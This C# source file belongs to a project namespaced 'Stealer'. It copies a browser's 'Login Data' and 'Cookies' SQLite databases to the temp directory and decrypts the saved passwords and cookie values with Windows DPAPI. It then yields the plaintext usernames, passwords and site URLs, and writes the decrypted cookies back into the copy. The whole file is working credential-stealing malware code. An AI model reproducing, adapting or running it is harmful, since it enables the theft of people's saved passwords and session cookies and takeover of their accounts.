using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Stealer
{
    public static class DPAPIBrowser
    {
        public static IEnumerable<CredentialModel> ReadDPAPIPasses(string[] dbPaths)
        {
            foreach (string path in dbPaths)
            {
                if (File.Exists(path))
                {
                    if (File.Exists(Path.GetTempPath() + @"Login Data"))
                    {
                        File.Delete(Path.GetTempPath() + @"Login Data");
                    }

                    File.Copy(path, Path.GetTempPath() + @"Login Data");
                    string dbPath = Path.GetTempPath() + @"Login Data";
                    string connectionString = "Data Source=" + dbPath + ";pooling=false";
                    using (SQLiteConnection conn = new SQLiteConnection(connectionString))
                    using (SQLiteCommand cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
                        conn.Open();
                        using (SQLiteDataReader reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                byte[] encryptedData = (byte[])reader[0];
                                byte[] decodedData =  ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                                string plainText  = Encoding.UTF8.GetString(decodedData);
                                yield return new CredentialModel()
                                {
                                    Password = plainText,
                                    Username = reader.GetString(1),
                                    Url = reader.GetString(2)
                                };
                            }
                        }
                        conn.Close();
                    }
                }
            }
        }

        public struct Data
        {
            public long creationtimeid;
            public byte[] data;
        }

        public static string[] ReadDPAPICookies(string[] dbPaths)
        {
            foreach (var dbPath in dbPaths)
            {
                if (File.Exists(dbPath))
                {
                    if (File.Exists(Path.GetTempPath() + @"Cookies"))
                    {
                        File.Delete(Path.GetTempPath() + @"Cookies");
                    }

                    File.Copy(dbPath, Path.GetTempPath() + @"Cookies");
                    var connectionString = "Data Source=" + Path.GetTempPath() + @"Cookies" + ";pooling=false";
                    
                    using (var conn = new SQLiteConnection(connectionString))
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = "SELECT encrypted_value,creation_utc FROM cookies";
                        
                        conn.Open();
                        List<Data> data = new List<Data>();
                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                var dt = new Data()
                                {
                                    data = ProtectedData.Unprotect((byte[])reader[0], null, DataProtectionScope.CurrentUser),
                                    creationtimeid = (long)reader[1]
                                };
                                data.Add(dt);
                            }
                        }
                        var sw = new System.Diagnostics.Stopwatch();
                        sw.Start();
                        cmd.CommandText = string.Empty;
                        for (var i = 0; i < data.Count; i++)
                        {
                            cmd.CommandText += $"UPDATE cookies SET encrypted_value=@encrypted_value{i} WHERE creation_utc={data[i].creationtimeid};{System.Environment.NewLine}";
                            cmd.Parameters.AddWithValue($"@encrypted_value{i}", data[i].data);
                        }
                        cmd.ExecuteNonQuery();
                        var s = sw.ElapsedMilliseconds;
                        conn.Close();
                    }
                    return null;
                }
                return null;
            }
            return null;
        }
    }
}
